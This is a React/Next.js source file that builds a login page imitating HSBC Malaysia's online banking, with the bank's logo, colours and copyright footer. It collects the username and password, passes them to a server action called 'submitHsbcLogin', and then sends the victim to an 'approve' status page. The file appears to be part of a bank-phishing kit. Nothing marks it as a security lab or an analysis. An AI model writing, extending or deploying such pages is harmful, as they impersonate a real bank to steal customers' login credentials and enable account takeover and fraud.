"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Loader2, ChevronDown, ChevronRight } from "lucide-react";
import { submitHsbcLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function HsbcLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitHsbcLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="flex h-20 items-center justify-between border-b border-gray-200 px-6">
        <div className="flex items-center">
          <Image
            src="/bank/HSBC_logo_(2018).svg"
            alt="HSBC Logo"
            width={140}
            height={40}
            className="h-10 w-auto"
          />
        </div>
        <button className="flex items-center gap-2 rounded bg-[#db0011] px-4 py-2 text-[14px] font-bold text-white transition-colors hover:bg-[#b8000e]">
          Log on / Register
          <span className="text-[10px]">▼</span>
        </button>
      </header>

      {/* Main Content */}
      <main className="mx-auto flex w-full max-w-xl flex-1 flex-col px-6 py-12">
        <h2 className="mb-10 text-[32px] font-light tracking-tight text-[#444]">
          Log on to Online Banking
        </h2>

        <form onSubmit={handleLogin} className="space-y-8">
          {error && (
            <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
              {error}
            </div>
          )}

          {/* Username Section */}
          <div className="space-y-3">
            <label className="text-[17px] font-medium text-[#444]">
              Please enter your username
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full rounded border border-[#007b82] py-4 px-4 text-[18px] outline-none transition-all focus:ring-2 focus:ring-[#007b82]/10"
              required
            />
            <button
              type="button"
              className="flex items-center gap-1.5 text-[15px] font-medium text-[#007b82] hover:underline"
            >
              <ChevronDown size={18} />
              What is a username?
            </button>
          </div>

          {/* Password Section */}
          <div className="space-y-3">
            <label className="text-[17px] font-medium text-[#444]">
              Please enter your password
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full rounded border border-[#007b82] py-4 px-4 text-[18px] outline-none transition-all focus:ring-2 focus:ring-[#007b82]/10"
              required
            />
          </div>

          {/* Remember Me */}
          <div className="flex items-center gap-3">
            <input
              type="checkbox"
              id="remember"
              className="h-6 w-6 rounded border-[#999] accent-[#db0011]"
            />
            <label htmlFor="remember" className="text-[17px] font-medium text-[#444] cursor-pointer">
              Remember me
            </label>
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isLoading}
            className="flex w-full items-center justify-center rounded bg-[#db0011] py-4 text-[20px] font-bold text-white shadow-lg transition-all active:scale-[0.98] disabled:opacity-80"
          >
            {isLoading ? (
              <Loader2 className="h-6 w-6 animate-spin" />
            ) : (
              "Login"
            )}
          </button>

          {/* Registration Link */}
          <div className="pt-4">
            <button
              type="button"
              className="flex items-center gap-1.5 text-[17px] font-medium text-[#333] hover:underline"
            >
              Not registered for online banking?
              <span className="text-gray-500 font-bold">&gt;</span>
            </button>
          </div>
        </form>
      </main>

      {/* Footer */}
      <footer className="bg-black py-10 px-6 text-center text-white">
        <div className="mx-auto max-w-2xl space-y-4">
          <p className="text-[13px] font-medium opacity-90">
            © HSBC Bank Malaysia Berhad 198401015221 (127776-V) 2026.
          </p>
          <p className="text-[13px] font-medium opacity-90 uppercase tracking-wide">
            All rights reserved
          </p>
          <p className="text-[13px] font-medium opacity-90">
            This website is designed for use in Malaysia. Cross-border
          </p>
        </div>
      </footer>
    </div>
  );
}
